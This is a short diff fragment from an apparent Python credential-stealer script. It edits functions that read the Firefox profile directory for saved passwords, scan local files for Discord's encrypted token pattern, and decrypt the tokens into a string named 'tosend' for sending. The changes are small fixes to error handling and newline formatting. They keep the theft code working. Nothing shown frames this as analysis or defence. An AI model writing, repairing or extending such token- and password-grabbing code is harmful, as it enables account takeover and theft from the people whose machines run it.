@@ -391,7 +391,7 @@ if yes == "yes":
 			except:
 				pass
 		except Exception as e:
-	  		return e
+	  		return str(e)
 	def PasswLinux():
 		try:
 			FirefoxPath = os.path.expanduser("~/.mozilla/firefox/")
@@ -448,7 +448,7 @@ if yes == "yes":
 							for x in files.readlines():
 								x.strip()
 								for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
-									tokens.append(values +"\n")
+									tokens.append(values)
 									
 					except PermissionError:
 						continue
@@ -459,7 +459,7 @@ if yes == "yes":
 					cleaned.append(i)
 			tosend = ""
 			for token in cleaned:
-				tosend = tosend + str(decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:]).encode())
+				tosend = tosend + str(decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:]).encode()) + "\n"
 			return tosend
 	"""
 
